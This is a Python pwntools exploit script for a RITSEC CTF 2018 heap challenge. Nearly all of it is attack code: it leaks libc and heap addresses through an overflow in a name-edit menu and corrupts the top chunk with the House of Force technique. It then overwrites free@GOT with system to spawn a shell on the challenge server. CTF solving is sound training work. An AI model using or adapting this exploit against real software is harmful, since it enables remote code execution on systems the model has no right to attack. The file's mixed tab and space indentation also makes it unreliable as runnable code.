#!/usr/bin/python

from pwn import *

LOCAL = False

def create_person(size,data):
	target.recvuntil("Enter your choice: ")
	target.sendline("1")
	target.recvuntil("Enter name length: ")
	target.sendline(size)
	target.recvuntil("Enter person's name: ")
	target.sendline(data)
	target.recvuntil("Enter person's age: ")
	target.sendline("0")

def edit_person(index,size,data):
	target.recvuntil("Enter your choice: ")
  	target.sendline("2")
	target.recvuntil("Enter person's index (0-based): ")
	target.sendline(index)
	target.recvuntil("Enter new name length: ")
  	target.sendline(size)
  	target.recvuntil("Enter the new name: ")
  	target.sendline(data)

def print_person(index):
	target.recvuntil("Enter your choice: ")
  	target.sendline("3")
  	target.recvuntil("Enter person's index (0-based): ")
  	target.sendline(index)

def del_person(index):
	target.recvuntil("Enter your choice: ")
  	target.sendline("4")
  	target.recvuntil("Enter person's index (0-based): ")
  	target.sendline(index)

def pwn():

	log.info("Yet Another HR Management Framework (pwn2) - RITSEC CTF 2018 - mphx2")

	log.info("allocating chunks...")
	create_person("120","A"*119)
	create_person("140","B"*139)
	create_person("160","C"*159)

	del_person("1")
	edit_person("0","129","A"*128)
	print_person("0")

	libc = target.recvuntil("Enter your choice: ")
	stdin_libc = u32(libc[134:138])
	libc_base = stdin_libc - 0x1b070a
	bin_sh = libc_base + 0x15902b

	log.success("libc base    addr: %#x", libc_base)

  	target.sendline("2")
	target.recvuntil("Enter person's index (0-based): ")
	target.sendline("0")
	target.recvuntil("Enter new name length: ")
  	target.sendline("129")
  	target.recvuntil("Enter the new name: ")
  	target.sendline("A"*120+p32(0x0)+p32(0x91))
	create_person("140","D"*139)
	edit_person("1","152","E"*144)
	print_person("1")

  	heap = target.recvuntil("Enter your choice: ")
	heap_main = u32(heap[154:158])
	heap_top = heap_main + 0xa0

	log.success("top chunk    addr: %#x", heap_top)

	log.info("reconstructing the heap structure and corrupting the top chunk")
	target.sendline("2")
  	target.recvuntil("Enter person's index (0-based): ")
  	target.sendline("0")
  	target.recvuntil("Enter new name length: ")
  	target.sendline("457")
  	target.recvuntil("Enter the new name: ")
  	target.sendline("A"*120+p32(0x0)+p32(0x91)+"E"*140+p32(0x11)+p32(bin_sh)*2+p32(0x0)+p32(0xa9)+"F"*160+p32(0x0)+p32(0xffffffff))

	log.info("house of force dance...")

	free = 0x8191018-0x30

	evil_size = (free) - (heap_top)
	evil_size = evil_size + 2**32
	log.success("evil size to right before free() is %#x", evil_size)

	system = libc_base + 0x3a940

	log.info("creating a new chunk with the evil size!")
	create_person(str(evil_size),"CCCCCCC")

	log.info("overwriting free@GOT to system@libc!")
  	create_person("300",p32(system)*10)

	log.info("take your shell!!!!!!!")
	del_person("2")

	target.interactive()

def main():
  	global target
  	if LOCAL:
    		target = process("./pwn2")
  	else:
    		target = remote("fun.ritsec.club",1337)
  	pwn()

if __name__ == "__main__":
  	main()
